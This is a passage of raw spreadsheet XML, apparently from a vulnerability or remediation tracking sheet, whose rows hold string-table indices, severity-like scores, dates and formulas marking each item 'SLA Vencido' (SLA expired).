      <c r="D216" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E216" s="4"/>
      <c r="F216" s="4"/>
      <c r="G216" s="6" t="s">
        <v>445</v>
      </c>
      <c r="H216" s="4" t="s">
        <v>865</v>
      </c>
      <c r="I216" s="4"/>
      <c r="J216" s="4" t="s">
        <v>861</v>
      </c>
      <c r="K216" s="6"/>
      <c r="L216" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M216" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N216" s="5">
        <v>5.3</v>
      </c>
      <c r="O216" s="14"/>
      <c r="P216" s="10"/>
      <c r="Q216" s="6" t="s">
        <v>447</v>
      </c>
      <c r="R216" s="4"/>
      <c r="S216" s="22"/>
      <c r="T216" s="8">
        <v>44969</v>
      </c>
      <c r="U216" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1240</v>
      </c>
      <c r="V216" s="8">
        <f t="shared" si="10"/>
        <v>45059</v>
      </c>
      <c r="W216" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X216" s="12"/>
      <c r="Y216" s="11"/>
      <c r="Z216" s="11"/>
      <c r="AA216" s="8">
        <v>45384</v>
      </c>
      <c r="AB216" s="32" t="s">
        <v>866</v>
      </c>
      <c r="AC216" s="32" t="s">
        <v>863</v>
      </c>
      <c r="AD216" s="9" t="s">
        <v>864</v>
      </c>
      <c r="AE216" s="8">
        <v>45199</v>
      </c>
      <c r="AF216" s="27" t="s">
        <v>497</v>
      </c>
      <c r="AG216" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="217" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A217" s="5">
        <v>216</v>
      </c>
      <c r="B217" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C217" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D217" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E217" s="4"/>
      <c r="F217" s="4"/>
      <c r="G217" s="60" t="s">
        <v>867</v>
      </c>
      <c r="H217" s="4" t="s">
        <v>868</v>
      </c>
      <c r="I217" s="4" t="s">
        <v>869</v>
      </c>
      <c r="J217" s="4" t="s">
        <v>870</v>
      </c>
      <c r="K217" s="6"/>
      <c r="L217" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M217" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N217" s="5">
        <v>4.2</v>
      </c>
      <c r="O217" s="14"/>
      <c r="P217" s="10">
        <v>190242107210</v>
      </c>
      <c r="Q217" s="6" t="s">
        <v>871</v>
      </c>
      <c r="R217" s="4"/>
      <c r="S217" s="22"/>
      <c r="T217" s="8">
        <v>44972</v>
      </c>
      <c r="U217" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1237</v>
      </c>
      <c r="V217" s="8">
        <f t="shared" si="10"/>
        <v>45062</v>
      </c>
      <c r="W217" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X217" s="12"/>
      <c r="Y217" s="11"/>
      <c r="Z217" s="11"/>
      <c r="AA217" s="8">
        <v>44991</v>
      </c>
      <c r="AB217" s="32" t="s">
        <v>872</v>
      </c>
      <c r="AC217" s="32" t="s">
        <v>873</v>
      </c>
      <c r="AD217" s="9" t="s">
        <v>874</v>
      </c>
      <c r="AE217" s="8"/>
      <c r="AF217" s="5" t="s">
        <v>497</v>
      </c>
      <c r="AG217" s="27" t="s">
        <v>875</v>
      </c>
    </row>
    <row r="218" spans="1:33" ht="159.5" x14ac:dyDescent="0.35">
      <c r="A218" s="5">
        <v>217</v>
      </c>
      <c r="B218" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C218" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D218" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E218" s="4"/>
      <c r="F218" s="4"/>
      <c r="G218" s="60" t="s">
        <v>867</v>
      </c>
      <c r="H218" s="4" t="s">
        <v>876</v>
      </c>
      <c r="I218" s="4" t="s">
        <v>877</v>
      </c>
      <c r="J218" s="4" t="s">
        <v>878</v>
      </c>
      <c r="K218" s="6"/>
      <c r="L218" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M218" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N218" s="5">
        <v>3.1</v>
      </c>
      <c r="O218" s="14"/>
      <c r="P218" s="10">
        <v>190242107210</v>
      </c>
      <c r="Q218" s="6" t="s">
        <v>871</v>
      </c>
      <c r="R218" s="4"/>
      <c r="S218" s="22"/>
      <c r="T218" s="8">
        <v>44972</v>
      </c>
      <c r="U218" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1237</v>
      </c>
      <c r="V218" s="8">
        <f t="shared" si="10"/>
        <v>45092</v>
      </c>
      <c r="W218" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X218" s="12"/>
      <c r="Y218" s="11"/>
      <c r="Z218" s="11"/>
      <c r="AA218" s="8">
        <v>45002</v>
      </c>
      <c r="AB218" s="32" t="s">
        <v>879</v>
      </c>
      <c r="AC218" s="32" t="s">
        <v>880</v>
      </c>
      <c r="AD218" s="9" t="s">
        <v>881</v>
      </c>
      <c r="AE218" s="8"/>
      <c r="AF218" s="5" t="s">
        <v>497</v>
      </c>
      <c r="AG218" s="27" t="s">
        <v>875</v>
      </c>
    </row>
    <row r="219" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A219" s="5">
        <v>218</v>
      </c>
      <c r="B219" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C219" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D219" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E219" s="4"/>
      <c r="F219" s="4"/>
      <c r="G219" s="60" t="s">
        <v>867</v>
      </c>
      <c r="H219" s="4" t="s">
        <v>882</v>
      </c>
      <c r="I219" s="4" t="s">
        <v>883</v>
      </c>
      <c r="J219" s="4" t="s">
        <v>884</v>
      </c>
      <c r="K219" s="6"/>
      <c r="L219" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M219" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N219" s="5">
        <v>2.6</v>
      </c>
      <c r="O219" s="14"/>
      <c r="P219" s="10">
        <v>190242107210</v>
      </c>
      <c r="Q219" s="6" t="s">
        <v>871</v>
      </c>
      <c r="R219" s="4"/>
      <c r="S219" s="22"/>
      <c r="T219" s="8">
        <v>44972</v>
      </c>
      <c r="U219" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1237</v>
      </c>
      <c r="V219" s="8">
        <f t="shared" si="10"/>
        <v>45092</v>
      </c>
      <c r="W219" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X219" s="12"/>
      <c r="Y219" s="11"/>
      <c r="Z219" s="11"/>
      <c r="AA219" s="8">
        <v>45002</v>
      </c>
      <c r="AB219" s="32" t="s">
        <v>885</v>
      </c>
      <c r="AC219" s="32" t="s">
        <v>886</v>
      </c>
      <c r="AD219" s="9" t="s">
        <v>887</v>
      </c>
      <c r="AE219" s="8"/>
      <c r="AF219" s="5" t="s">
        <v>497</v>
      </c>
      <c r="AG219" s="27" t="s">
        <v>875</v>
      </c>
    </row>
    <row r="220" spans="1:33" ht="130.5" x14ac:dyDescent="0.35">
      <c r="A220" s="5">
        <v>219</v>
      </c>
      <c r="B220" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C220" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D220" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E220" s="4"/>
      <c r="F220" s="4"/>
      <c r="G220" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H220" s="4" t="s">
        <v>888</v>
      </c>
      <c r="I220" s="4" t="s">
        <v>889</v>
      </c>
      <c r="J220" s="4" t="s">
        <v>890</v>
      </c>
      <c r="K220" s="6"/>
      <c r="L220" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M220" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N220" s="5">
        <v>5.0999999999999996</v>
      </c>
      <c r="O220" s="14"/>
      <c r="P220" s="10"/>
      <c r="Q220" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R220" s="4"/>
      <c r="S220" s="22"/>
      <c r="T220" s="8">
        <v>45093</v>
      </c>
      <c r="U220" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1116</v>
      </c>
      <c r="V220" s="8">
        <f t="shared" si="10"/>
        <v>45183</v>
      </c>
      <c r="W220" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X220" s="12"/>
      <c r="Y220" s="11"/>
      <c r="Z220" s="11"/>
      <c r="AA220" s="8"/>
      <c r="AB220" s="32" t="s">
        <v>891</v>
      </c>
      <c r="AC220" s="32" t="s">
        <v>892</v>
      </c>
      <c r="AD220" s="32" t="s">
        <v>893</v>
      </c>
      <c r="AE220" s="27" t="s">
        <v>894</v>
      </c>
      <c r="AF220" s="14"/>
      <c r="AG220" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="221" spans="1:33" ht="145" x14ac:dyDescent="0.35">
      <c r="A221" s="5">
        <v>220</v>
      </c>
      <c r="B221" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C221" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D221" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E221" s="4"/>
      <c r="F221" s="4"/>
      <c r="G221" s="6" t="s">
        <v>755</v>
      </c>
      <c r="H221" s="4" t="s">
        <v>895</v>
      </c>
      <c r="I221" s="4" t="s">
        <v>896</v>
      </c>
      <c r="J221" s="4" t="s">
        <v>80</v>
      </c>
      <c r="K221" s="6"/>
      <c r="L221" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M221" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N221" s="5">
        <v>4.3</v>
      </c>
      <c r="O221" s="14"/>
      <c r="P221" s="10"/>
      <c r="Q221" s="6" t="s">
        <v>759</v>
      </c>
      <c r="R221" s="4"/>
      <c r="S221" s="22"/>
      <c r="T221" s="8">
        <v>45093</v>
      </c>
      <c r="U221" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1116</v>
      </c>
      <c r="V221" s="8">
        <f t="shared" si="10"/>
        <v>45183</v>
      </c>
      <c r="W221" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X221" s="12"/>
      <c r="Y221" s="11"/>
      <c r="Z221" s="11"/>
      <c r="AA221" s="8"/>
      <c r="AB221" s="32" t="s">
        <v>897</v>
      </c>
      <c r="AC221" s="32" t="s">
        <v>898</v>
      </c>
      <c r="AD221" s="9" t="s">
        <v>899</v>
      </c>
      <c r="AE221" s="27" t="s">
        <v>900</v>
      </c>
      <c r="AF221" s="14" t="s">
        <v>901</v>
      </c>
      <c r="AG221" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="222" spans="1:33" ht="145" x14ac:dyDescent="0.35">
      <c r="A222" s="5">
        <v>221</v>
      </c>
      <c r="B222" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C222" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D222" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E222" s="4"/>
      <c r="F222" s="4"/>
      <c r="G222" s="6" t="s">
        <v>755</v>
      </c>
      <c r="H222" s="4" t="s">
        <v>902</v>
      </c>
      <c r="I222" s="4" t="s">
        <v>903</v>
      </c>
      <c r="J222" s="4" t="s">
        <v>870</v>
      </c>
      <c r="K222" s="6"/>
      <c r="L222" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M222" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N222" s="5">
        <v>3.7</v>
      </c>
      <c r="O222" s="14"/>
      <c r="P222" s="10"/>
      <c r="Q222" s="6" t="s">
        <v>759</v>
      </c>
      <c r="R222" s="4"/>
      <c r="S222" s="22"/>
      <c r="T222" s="8">
        <v>45093</v>
      </c>
      <c r="U222" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1116</v>
      </c>
      <c r="V222" s="8">
        <f t="shared" si="10"/>
        <v>45213</v>
      </c>
      <c r="W222" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X222" s="12"/>
      <c r="Y222" s="11"/>
      <c r="Z222" s="11"/>
      <c r="AA222" s="8">
        <v>45547</v>
      </c>
      <c r="AB222" s="32" t="s">
        <v>904</v>
      </c>
      <c r="AC222" s="32" t="s">
        <v>873</v>
      </c>
      <c r="AD222" s="9" t="s">
        <v>905</v>
      </c>
      <c r="AE222" s="8" t="s">
        <v>906</v>
      </c>
      <c r="AF222" s="5" t="s">
        <v>907</v>
      </c>
      <c r="AG222" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="223" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A223" s="5">
        <v>222</v>
      </c>
      <c r="B223" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C223" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D223" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E223" s="4"/>
      <c r="F223" s="4"/>
      <c r="G223" s="6" t="s">
        <v>755</v>
      </c>
      <c r="H223" s="4" t="s">
        <v>908</v>
      </c>
      <c r="I223" s="4" t="s">
        <v>909</v>
      </c>
      <c r="J223" s="4" t="s">
        <v>910</v>
      </c>
      <c r="K223" s="6"/>
      <c r="L223" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M223" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N223" s="5">
        <v>3.4</v>
      </c>
      <c r="O223" s="14"/>
      <c r="P223" s="10"/>
      <c r="Q223" s="6" t="s">
        <v>759</v>
      </c>
      <c r="R223" s="4"/>
      <c r="S223" s="22"/>
      <c r="T223" s="8">
        <v>45093</v>
      </c>
      <c r="U223" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1116</v>
      </c>
      <c r="V223" s="8">
        <f t="shared" si="10"/>
        <v>45213</v>
      </c>
      <c r="W223" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X223" s="12"/>
      <c r="Y223" s="11"/>
      <c r="Z223" s="11"/>
      <c r="AA223" s="8">
        <v>45547</v>
      </c>
      <c r="AB223" s="32" t="s">
        <v>911</v>
      </c>
      <c r="AC223" s="32" t="s">
        <v>912</v>
      </c>
      <c r="AD223" s="9" t="s">
        <v>905</v>
      </c>
      <c r="AE223" s="8" t="s">
        <v>906</v>
      </c>
      <c r="AF223" s="5" t="s">
        <v>907</v>
      </c>
      <c r="AG223" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="224" spans="1:33" ht="232" x14ac:dyDescent="0.35">
      <c r="A224" s="5">
        <v>223</v>
      </c>
      <c r="B224" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C224" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D224" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E224" s="4"/>
      <c r="F224" s="4"/>
      <c r="G224" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H224" s="4" t="s">
        <v>913</v>
      </c>
      <c r="I224" s="4" t="s">
        <v>914</v>
      </c>
      <c r="J224" s="4" t="s">
        <v>915</v>
      </c>
      <c r="K224" s="6"/>
      <c r="L224" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M224" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N224" s="5">
        <v>3.2</v>
      </c>
      <c r="O224" s="14"/>
      <c r="P224" s="10"/>
      <c r="Q224" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R224" s="4"/>
      <c r="S224" s="22"/>
      <c r="T224" s="8">
        <v>45093</v>
      </c>
      <c r="U224" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1116</v>
      </c>
      <c r="V224" s="8">
        <f t="shared" si="10"/>
        <v>45213</v>
      </c>
      <c r="W224" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X224" s="12"/>
      <c r="Y224" s="11"/>
      <c r="Z224" s="11"/>
      <c r="AA224" s="8">
        <v>45588</v>
      </c>
      <c r="AB224" s="32" t="s">
        <v>916</v>
      </c>
      <c r="AC224" s="32" t="s">
        <v>917</v>
      </c>
      <c r="AD224" s="9" t="s">
        <v>918</v>
      </c>
      <c r="AE224" s="8" t="s">
        <v>147</v>
      </c>
      <c r="AF224" s="5"/>
      <c r="AG224" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="225" spans="1:33" ht="130.5" x14ac:dyDescent="0.35">
      <c r="A225" s="5">
        <v>224</v>
      </c>
      <c r="B225" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C225" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D225" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E225" s="4"/>
      <c r="F225" s="4"/>
      <c r="G225" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H225" s="4" t="s">
        <v>919</v>
      </c>
      <c r="I225" s="4" t="s">
        <v>920</v>
      </c>
      <c r="J225" s="4" t="s">
        <v>110</v>
      </c>
      <c r="K225" s="6"/>
      <c r="L225" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M225" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N225" s="5">
        <v>3.2</v>
      </c>
      <c r="O225" s="14" t="s">
        <v>112</v>
      </c>
      <c r="P225" s="10"/>
      <c r="Q225" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R225" s="4"/>
      <c r="S225" s="22"/>
      <c r="T225" s="8">
        <v>45093</v>
      </c>
      <c r="U225" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1116</v>
      </c>
      <c r="V225" s="8">
        <f t="shared" si="10"/>
        <v>45213</v>
      </c>
      <c r="W225" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X225" s="12"/>
      <c r="Y225" s="11"/>
      <c r="Z225" s="11"/>
      <c r="AA225" s="8"/>
      <c r="AB225" s="32" t="s">
        <v>921</v>
      </c>
      <c r="AC225" s="32" t="s">
        <v>922</v>
      </c>
      <c r="AD225" s="9" t="s">
        <v>923</v>
      </c>
      <c r="AE225" s="8" t="s">
        <v>147</v>
      </c>
      <c r="AF225" s="5"/>
      <c r="AG225" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="226" spans="1:33" ht="217.5" x14ac:dyDescent="0.35">
      <c r="A226" s="5">
        <v>225</v>
      </c>
      <c r="B226" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C226" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D226" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E226" s="4"/>
      <c r="F226" s="4"/>
      <c r="G226" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H226" s="4" t="s">
        <v>924</v>
      </c>
      <c r="I226" s="4" t="s">
        <v>925</v>
      </c>
      <c r="J226" s="4" t="s">
        <v>926</v>
      </c>
      <c r="K226" s="6"/>
      <c r="L226" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M226" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N226" s="5">
        <v>6.5</v>
      </c>
      <c r="O226" s="14"/>
      <c r="P226" s="10"/>
      <c r="Q226" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R226" s="4"/>
      <c r="S226" s="22"/>
      <c r="T226" s="8">
        <v>45093</v>
      </c>
      <c r="U226" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1116</v>
      </c>
      <c r="V226" s="8">
        <f t="shared" si="10"/>
        <v>45183</v>
      </c>
      <c r="W226" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X226" s="12"/>
      <c r="Y226" s="11"/>
      <c r="Z226" s="11"/>
      <c r="AA226" s="8">
        <v>45189</v>
      </c>
      <c r="AB226" s="32" t="s">
        <v>927</v>
      </c>
      <c r="AC226" s="32" t="s">
        <v>70</v>
      </c>
      <c r="AD226" s="9" t="s">
        <v>928</v>
      </c>
      <c r="AE226" s="8">
        <v>45179</v>
      </c>
      <c r="AF226" s="5" t="s">
        <v>929</v>
      </c>
      <c r="AG226" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="227" spans="1:33" ht="275.5" x14ac:dyDescent="0.35">
      <c r="A227" s="5">
        <v>226</v>
      </c>
      <c r="B227" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C227" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D227" s="5"/>
      <c r="E227" s="4"/>
      <c r="F227" s="4"/>
      <c r="G227" s="6" t="s">
        <v>755</v>
      </c>
      <c r="H227" s="9" t="s">
        <v>930</v>
      </c>
      <c r="I227" s="4" t="s">
        <v>931</v>
      </c>
      <c r="J227" s="4" t="s">
        <v>466</v>
      </c>
      <c r="K227" s="6"/>
      <c r="L227" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M227" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N227" s="5">
        <v>5.3</v>
      </c>
      <c r="O227" s="14"/>
      <c r="P227" s="10"/>
      <c r="Q227" s="6" t="s">
        <v>759</v>
      </c>
      <c r="R227" s="4"/>
      <c r="S227" s="22"/>
      <c r="T227" s="8">
        <v>45119</v>
      </c>
      <c r="U227" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1090</v>
      </c>
      <c r="V227" s="8">
        <f t="shared" si="10"/>
        <v>45209</v>
      </c>
      <c r="W227" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X227" s="12"/>
      <c r="Y227" s="11"/>
      <c r="Z227" s="11"/>
      <c r="AA227" s="8"/>
      <c r="AB227" s="32" t="s">
        <v>932</v>
      </c>
      <c r="AC227" s="32" t="s">
        <v>933</v>
      </c>
      <c r="AD227" s="9" t="s">
        <v>934</v>
      </c>
      <c r="AE227" s="8" t="s">
        <v>763</v>
      </c>
      <c r="AF227" s="6" t="s">
        <v>935</v>
      </c>
      <c r="AG227" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="228" spans="1:33" ht="174" x14ac:dyDescent="0.35">
      <c r="A228" s="5">
        <v>227</v>
      </c>
      <c r="B228" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C228" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D228" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E228" s="4"/>
      <c r="F228" s="4"/>
      <c r="G228" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H228" s="9" t="s">
        <v>936</v>
      </c>
      <c r="I228" s="4" t="s">
        <v>937</v>
      </c>
      <c r="J228" s="4" t="s">
        <v>870</v>
      </c>
      <c r="K228" s="6"/>
      <c r="L228" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M228" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N228" s="5">
        <v>3.1</v>
      </c>
      <c r="O228" s="14"/>
      <c r="P228" s="10"/>
      <c r="Q228" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R228" s="4"/>
      <c r="S228" s="22"/>
      <c r="T228" s="8">
        <v>45119</v>
      </c>
      <c r="U228" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1090</v>
      </c>
      <c r="V228" s="8">
        <f t="shared" si="10"/>
        <v>45239</v>
      </c>
      <c r="W228" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X228" s="12"/>
      <c r="Y228" s="11"/>
      <c r="Z228" s="11"/>
      <c r="AA228" s="8"/>
      <c r="AB228" s="32" t="s">
        <v>938</v>
      </c>
      <c r="AC228" s="32" t="s">
        <v>873</v>
      </c>
      <c r="AD228" s="9" t="s">
        <v>905</v>
      </c>
      <c r="AE228" s="40" t="s">
        <v>792</v>
      </c>
      <c r="AF228" s="21" t="s">
        <v>939</v>
      </c>
      <c r="AG228" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="229" spans="1:33" ht="145" x14ac:dyDescent="0.35">
      <c r="A229" s="5">
        <v>228</v>
      </c>
      <c r="B229" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C229" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D229" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E229" s="4"/>
      <c r="F229" s="4"/>
      <c r="G229" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H229" s="9" t="s">
        <v>940</v>
      </c>
      <c r="I229" s="4" t="s">
        <v>941</v>
      </c>
      <c r="J229" s="4" t="s">
        <v>910</v>
      </c>
      <c r="K229" s="6"/>
      <c r="L229" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M229" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N229" s="5">
        <v>3.4</v>
      </c>
      <c r="O229" s="14"/>
      <c r="P229" s="10"/>
      <c r="Q229" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R229" s="4"/>
      <c r="S229" s="22"/>
      <c r="T229" s="8">
        <v>45119</v>
      </c>
      <c r="U229" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1090</v>
      </c>
      <c r="V229" s="8">
        <f t="shared" si="10"/>
        <v>45239</v>
      </c>
      <c r="W229" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X229" s="12"/>
      <c r="Y229" s="11"/>
      <c r="Z229" s="11"/>
      <c r="AA229" s="8"/>
      <c r="AB229" s="32" t="s">
        <v>942</v>
      </c>
      <c r="AC229" s="32" t="s">
        <v>912</v>
      </c>
      <c r="AD229" s="9" t="s">
        <v>905</v>
      </c>
      <c r="AE229" s="27" t="s">
        <v>792</v>
      </c>
      <c r="AF229" s="21" t="s">
        <v>939</v>
      </c>
      <c r="AG229" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="230" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A230" s="5">
        <v>229</v>
      </c>
      <c r="B230" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C230" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D230" s="5"/>
      <c r="E230" s="4"/>
      <c r="F230" s="4"/>
      <c r="G230" s="6" t="s">
        <v>445</v>
      </c>
      <c r="H230" s="4" t="s">
        <v>943</v>
      </c>
      <c r="I230" s="4"/>
      <c r="J230" s="4" t="s">
        <v>944</v>
      </c>
      <c r="K230" s="6"/>
      <c r="L230" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M230" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N230" s="5">
        <v>5.3</v>
      </c>
      <c r="O230" s="14"/>
      <c r="P230" s="10"/>
      <c r="Q230" s="6" t="s">
        <v>447</v>
      </c>
      <c r="R230" s="4"/>
      <c r="S230" s="22"/>
      <c r="T230" s="8">
        <v>45052</v>
      </c>
      <c r="U230" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1157</v>
      </c>
      <c r="V230" s="8">
        <f t="shared" si="10"/>
        <v>45142</v>
      </c>
      <c r="W230" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X230" s="12"/>
      <c r="Y230" s="11"/>
      <c r="Z230" s="11"/>
      <c r="AA230" s="8">
        <v>45186</v>
      </c>
      <c r="AB230" s="32" t="s">
        <v>945</v>
      </c>
      <c r="AC230" s="32" t="s">
        <v>946</v>
      </c>
      <c r="AD230" s="9"/>
      <c r="AE230" s="8"/>
      <c r="AF230" s="5" t="s">
        <v>497</v>
      </c>
      <c r="AG230" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="231" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A231" s="5">
        <v>230</v>
      </c>
      <c r="B231" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C231" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D231" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E231" s="4"/>
      <c r="F231" s="4"/>
      <c r="G231" s="6" t="s">
        <v>445</v>
      </c>
      <c r="H231" s="4" t="s">
        <v>947</v>
      </c>
      <c r="I231" s="4"/>
      <c r="J231" s="4" t="s">
        <v>948</v>
      </c>
      <c r="K231" s="6"/>
      <c r="L231" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M231" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N231" s="5">
        <v>6.1</v>
      </c>
      <c r="O231" s="14"/>
      <c r="P231" s="10"/>
      <c r="Q231" s="6" t="s">
        <v>447</v>
      </c>
      <c r="R231" s="4"/>
      <c r="S231" s="22"/>
      <c r="T231" s="8">
        <v>45031</v>
      </c>
      <c r="U231" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1178</v>
      </c>
      <c r="V231" s="8">
        <f t="shared" si="10"/>
        <v>45121</v>
      </c>
      <c r="W231" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X231" s="12"/>
      <c r="Y231" s="11"/>
      <c r="Z231" s="11"/>
      <c r="AA231" s="8">
        <v>45471</v>
      </c>
      <c r="AB231" s="32" t="s">
        <v>949</v>
      </c>
      <c r="AC231" s="32" t="s">
        <v>950</v>
      </c>
      <c r="AD231" s="9"/>
      <c r="AE231" s="8">
        <v>45199</v>
      </c>
      <c r="AF231" s="27" t="s">
        <v>951</v>
      </c>
      <c r="AG231" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="232" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A232" s="5">
        <v>231</v>
